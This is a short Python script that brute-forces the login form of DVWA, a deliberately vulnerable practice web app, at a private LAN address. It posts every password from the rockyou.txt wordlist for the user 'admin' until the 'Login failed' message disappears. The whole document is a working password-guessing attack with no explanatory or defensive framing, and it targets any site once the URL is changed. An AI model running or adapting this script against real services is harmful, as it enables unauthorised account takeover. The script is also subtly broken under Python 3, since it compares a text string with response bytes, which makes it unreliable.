#!/usr/bin/env python
import requests

target_url = "http://192.168.29.97/dvwa/login.php" # set the target post url
data_dict = {"username":"admin","password":"password","Login":"submit"} # set the name value


with open("rockyou.txt","r") as word_list:
    for list in word_list:
        word = list.strip()
        data_dict["password"] = word
        response = requests.post(target_url,data=data_dict)
        if "Login failed" not in response.content:
            print ("[+] login  password found ----> " + word) 
            exit()  

print("[+] Reached End Of Line ......")